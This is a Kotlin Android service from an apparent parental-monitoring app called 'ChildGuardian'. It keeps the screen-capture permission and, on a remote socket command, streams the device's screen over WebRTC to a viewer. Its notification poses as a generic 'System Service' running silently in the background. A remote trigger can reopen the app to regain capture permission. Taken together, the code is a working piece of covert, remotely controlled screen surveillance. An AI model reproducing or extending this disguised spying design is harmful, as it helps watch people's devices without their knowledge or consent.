package com.childguardian.services.screen

import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.childguardian.MainActivity
import com.childguardian.data.remote.socket.SocketManager
import com.childguardian.webrtc.WebRTCManager
import dagger.hilt.android.AndroidEntryPoint
import org.json.JSONObject
import org.webrtc.*
import timber.log.Timber
import javax.inject.Inject

@AndroidEntryPoint
class ScreenCaptureService : Service() {

    @Inject lateinit var webRTCManager: WebRTCManager
    @Inject lateinit var socketManager: SocketManager
    @Inject lateinit var mediaProjectionHolder: MediaProjectionHolder

    private var viewerId: String? = null
    private var isStreaming = false
    private var lastStreamRequestTime = 0L

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        // No startForeground here! Prevents Android 14 instant crash.
        Timber.d("ScreenCaptureService created")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("screen_capture_channel", "System Service", NotificationManager.IMPORTANCE_LOW).apply {
                setSound(null, null)
                enableVibration(false)
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, "screen_capture_channel")
            .setContentTitle("System Service")
            .setContentText("Running in background")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        when (intent?.action) {
            "ACTION_SAVE_TICKET" -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(1001, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                } else {
                    startForeground(1001, createNotification())
                }

                val code = intent.getIntExtra("RESULT_CODE", Activity.RESULT_CANCELED)
                val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra("DATA", Intent::class.java)
                } else {
                    @Suppress("DEPRECATION") intent.getParcelableExtra("DATA")
                }

                if (data != null) {
                    mediaProjectionHolder.saveTicket(code, data)
                }
            }

            "ACTION_START_STREAM" -> {
                val now = System.currentTimeMillis()
                if (now - lastStreamRequestTime < 2000) return START_STICKY
                lastStreamRequestTime = now
                viewerId = intent.getStringExtra("VIEWER_ID")

                if (mediaProjectionHolder.hasTicket() && !isStreaming) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        startForeground(1001, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                    } else {
                        startForeground(1001, createNotification())
                    }
                    isStreaming = true
                    setupSignalingListeners()
                    webRTCManager.startCapture(mediaProjectionHolder.permissionIntent!!, 720, 1280)
                    setupWebRTC()
                } else if (isStreaming) {
                    setupWebRTC()
                } else {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        startForeground(1001, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    } else {
                        startForeground(1001, createNotification())
                    }
                    val wakeIntent = Intent(this, MainActivity::class.java).apply {
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                        putExtra("REMOTE_TRIGGER", true)
                    }
                    startActivity(wakeIntent)
                }
            }
        }
        return START_STICKY
    }

    private fun setupSignalingListeners() {
        socketManager.on("answer") { args ->
            if (args.isNotEmpty()) {
                try {
                    val answerSdp = (args[0] as JSONObject).getJSONObject("answer")
                    webRTCManager.setRemoteDescription(SessionDescription(
                        SessionDescription.Type.fromCanonicalForm(answerSdp.getString("type")),
                        answerSdp.getString("sdp")
                    ))
                } catch (e: Exception) {}
            }
        }

        socketManager.on("ice-candidate") { args ->
            if (args.isNotEmpty()) {
                try {
                    val data = args[0] as JSONObject
                    val candidateData = data.getJSONObject("candidate")
                    val sdpString = if (candidateData.has("candidate")) candidateData.getString("candidate") else candidateData.getString("sdp")
                    webRTCManager.addIceCandidate(IceCandidate(
                        candidateData.getString("sdpMid"),
                        candidateData.getInt("sdpMLineIndex"),
                        sdpString
                    ))
                } catch (e: Exception) {}
            }
        }

        socketManager.on(io.socket.client.Socket.EVENT_DISCONNECT) { handleDisconnect() }
    }

    private fun setupWebRTC() {
        val iceServers = listOf(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())

        webRTCManager.createPeerConnection(iceServers, object : PeerConnection.Observer {
            override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
            override fun onIceConnectionReceivingChange(b: Boolean) {}
            override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
            override fun onIceCandidatesRemoved(candidates: Array<out IceCandidate>?) {}
            override fun onAddStream(stream: MediaStream?) {}
            override fun onRemoveStream(stream: MediaStream?) {}
            override fun onDataChannel(dataChannel: DataChannel?) {}
            override fun onRenegotiationNeeded() {}

            override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                if (state == PeerConnection.IceConnectionState.DISCONNECTED ||
                    state == PeerConnection.IceConnectionState.FAILED ||
                    state == PeerConnection.IceConnectionState.CLOSED) {
                    handleDisconnect()
                }
            }

            override fun onIceCandidate(candidate: IceCandidate?) {
                candidate?.let {
                    val candidateJson = JSONObject().apply {
                        put("viewerId", viewerId)
                        put("targetId", viewerId)
                        put("candidate", JSONObject().apply {
                            put("sdpMid", it.sdpMid)
                            put("sdpMLineIndex", it.sdpMLineIndex)
                            put("sdp", it.sdp)
                        })
                    }
                    socketManager.emit("ice-candidate", candidateJson)
                }
            }
        })

        webRTCManager.addVideoTrack()

        webRTCManager.onSessionDescription = { sdp ->
            val offerJson = JSONObject().apply {
                put("viewerId", viewerId)
                put("targetId", viewerId)
                put("offer", JSONObject().apply {
                    put("type", sdp.type.canonicalForm())
                    put("sdp", sdp.description)
                })
            }
            socketManager.emit("offer", offerJson)
        }
        webRTCManager.createOffer()
    }

    private fun handleDisconnect() {
        if (isStreaming) {
            isStreaming = false
            webRTCManager.release()
            mediaProjectionHolder.clearTicket()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        socketManager.off("answer")
        socketManager.off("ice-candidate")
        socketManager.off(io.socket.client.Socket.EVENT_DISCONNECT)
        webRTCManager.release()
        isStreaming = false
    }

    override fun onBind(intent: Intent?): IBinder? = null
}